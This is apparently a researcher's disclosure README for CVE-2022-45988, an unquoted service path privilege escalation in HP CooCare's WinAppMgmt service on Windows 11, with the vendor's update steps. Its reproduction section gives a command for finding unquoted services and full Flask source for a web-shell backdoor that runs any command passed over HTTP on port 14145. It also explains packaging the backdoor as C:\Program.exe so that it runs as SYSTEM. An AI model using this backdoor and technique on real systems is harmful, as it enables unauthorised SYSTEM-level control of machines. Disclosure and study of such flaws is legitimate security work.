# CVE-2022-45988 StarSoftComm HP CooCare An elevation of privilege vulnerability exists 


####################################################

I have contacted with hp-security-alert They have fixed this bug. About StarSoftComm CooCare [HP-PSRT-IR #4106] 
![image](https://github.com/happy0717/HP_CooCare_An_elevation_of_privilege_vulnerability_exists-/blob/main/7.png)
The vendor responded with the following information:

Follow these steps to update:

1.	Launch eService
2.	Wait about 3 mins
3.	Close and launch eService again. 
4.	Check version is v5.364 or later.

#####################################


An elevation of privilege vulnerability exists in StarSoftComm HP CooCare which could allow an attacker to elevate their privilege level
e管家超级版是HP星14 pro 自带的一款远程诊断软件，该软件为StarSoftComm(软通科技)旗下产品

test on windows 11 22621.819   HP LAPTOP HP Pavilion Plus 14 英寸笔记本电脑 14-eh0000 (56D77AV)

Affected version: CooCare below v5.364

#Vulnerability reproduction

#The first step：wmic service get name,displayname,pathname,startmode |findstr /i "Auto" |findstr /i /v "C:\Windows\\" |findstr /i /v """ 
find the service  （使用上述CMD命令找到未引用的服务）

![image](https://github.com/happy0717/HP_CooCare_An_elevation_of_privilege_vulnerability_exists-/blob/main/1.png)

The service name is Windows Application Management Service = AKA = WinAppMgmt  
服务的名称叫做Windows Application Management Service 简称是WinAppMgmt


![image](https://github.com/happy0717/HP_CooCare_An_elevation_of_privilege_vulnerability_exists-/blob/main/2.png)

The service is frome StarSoftComm CooCare

![image](https://github.com/happy0717/StarSoftComm_HP_CooCare_An_elevation_of_privilege_vulnerability_exists-/blob/main/3.png)

#Step 2：Prepare a malicious program

![image](https://github.com/happy0717/windows-Logi-OptionsPlus-OptionsPlusUpdaterService-is-Vulnerable-Services/blob/main/pic2.png)

    from flask import Flask, request
    import os

    app = Flask(__name__)

    @app.route('/')
    def hello_world():
        r = request.args.getlist('cmd')  #Reception? cmd= parameter
        a=os.popen(r[0])  #Execute system commands
        l = a.read()
        return l  #return

    if __name__ == '__main__':
        app.run(host='0.0.0.0', port=14145, debug=True)  #Listen HTTP port 14145



I was useing python3 flask write a malicious exe .It can listenHTTP port 14145 and execute system commands.

Using commands pyinstaller.exe --onefile --windowed -F -w python_test.py make a malicious exe.



#Step 3：Put malware into path C:\ and rename malware to Program.exe


![image](https://github.com/happy0717/StarSoftComm_HP_CooCare_An_elevation_of_privilege_vulnerability_exists-/blob/main/4.png)



#Step 4：Start the Windows Application Management Service

If Windows Application Management Service is already start， you can restart it


![image](https://github.com/happy0717/StarSoftComm_HP_CooCare_An_elevation_of_privilege_vulnerability_exists-/blob/main/5.png)



#Step 5：Wait Windows Application Management Service start and execute the system commands
C:\Program.exe run as system

When I see Windows Application Management Service start in Taskmgr.exe whit SYSTEM, Then I can Open browser input http://127.0.0.1:14145?cmd=whoami

Wait..........

for...

it.

NT SYSTEM

![image](https://github.com/happy0717/StarSoftComm_HP_CooCare_An_elevation_of_privilege_vulnerability_exists-/blob/main/6.png)
